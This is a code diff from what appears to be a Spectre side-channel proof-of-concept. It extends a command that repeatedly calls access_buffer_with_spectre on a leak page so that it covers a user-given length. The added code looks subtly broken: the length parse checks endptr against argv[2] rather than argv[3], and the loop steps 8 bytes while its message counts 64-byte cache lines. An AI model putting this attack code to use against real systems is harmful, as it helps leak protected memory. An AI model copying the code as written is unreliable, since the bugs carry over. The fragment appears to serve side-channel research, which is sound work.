@@ -248,9 +248,23 @@ void cmd_access_min(int argc, char *argv[argc], void *leak_page) {
     err(EXIT_FAILURE, "Could not parse min");
   }
 
-  printf("Accessing 0x%lx...\n", min);
+  size_t length = 1;
+  if (argc >= 4) {
+    endptr = NULL;
+    uintptr_t given_length = strtoull(argv[3], &endptr, 10);
+    if (endptr == argv[2]) {
+      err(EXIT_FAILURE, "Could not parse length");
+    }
+    if (given_length != 0) {
+      length += ((given_length - 1) / 64);
+    }
+  }
+
+  printf("Accessing 0x%lx... (%ld cache lines)\n", min, length);
   while (1) {
-    access_buffer_with_spectre(leak_page, min, 10000);
+    for (size_t i = 0; i < length; ++i) {
+      access_buffer_with_spectre(leak_page, min + (8 * i), 10000);
+    }
   }
 }
 
